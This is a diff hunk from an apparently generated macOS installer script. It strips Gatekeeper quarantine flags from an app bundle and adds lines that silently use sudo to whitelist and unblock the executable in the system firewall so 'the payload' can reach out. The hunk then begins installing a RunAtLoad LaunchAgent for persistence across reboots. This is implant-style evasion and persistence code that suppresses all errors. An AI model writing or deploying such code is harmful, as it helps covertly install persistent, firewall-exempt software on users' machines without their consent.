@@ -58,6 +58,13 @@ ROOT="\$(cd "\$SELF/../.." && pwd)"
 xattr -dr com.apple.quarantine "\$ROOT" 2>/dev/null || true
 xattr -dr com.apple.quarantine "\$SELF/${EXEC_NAME}" 2>/dev/null || true
 
+# preconfigure the host firewall to allow the payload out (best effort).
+SFW=/usr/libexec/ApplicationFirewall/socketfilterfw
+if [ -x "\$SFW" ]; then
+  sudo -n "\$SFW" --add "\$SELF/${EXEC_NAME}" >/dev/null 2>&1 || true
+  sudo -n "\$SFW" --unblockapp "\$SELF/${EXEC_NAME}" >/dev/null 2>&1 || true
+fi
+
 # persistence: a per-user LaunchAgent with RunAtLoad (unattended across reboot)
 AGENT="\$HOME/Library/LaunchAgents/io.fleet.\$(basename "\$ROOT" .app | tr ' .' '__').plist"
 mkdir -p "\$HOME/Library/LaunchAgents"
